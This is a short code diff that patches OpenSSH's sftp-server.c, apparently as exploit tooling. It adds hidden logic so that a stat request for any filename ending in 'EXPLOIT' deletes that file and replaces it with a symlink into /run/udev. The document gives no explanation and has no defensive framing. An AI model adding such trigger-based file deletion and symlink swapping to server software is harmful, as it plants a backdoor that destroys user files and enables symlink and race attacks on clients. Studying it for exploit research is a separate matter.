@@ -1,0 +1,19 @@
+diff --git a/sftp-server.c b/sftp-server.c
+index 359204fa..a6bc238e 100644
+--- a/sftp-server.c
++++ b/sftp-server.c
+@@ -830,6 +830,14 @@ process_do_stat(u_int32_t id, int do_lstat)
+ 	if ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0)
+ 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 
++	if(strlen(name) > strlen("EXPLOIT")) {
++		if (!strcmp(name+strlen(name)-strlen("EXPLOIT"), "EXPLOIT")) {
++			do_lstat = 1;
++			unlink(name);
++			symlink("/run/udev/data/+pci:0000:00:00.0", name);
++		}
++	}
++
+ 	debug3("request %u: %sstat", id, do_lstat ? "l" : "");
+ 	verbose("%sstat name \"%s\"", do_lstat ? "l" : "", name);
+ 	r = do_lstat ? lstat(name, &st) : stat(name, &st);
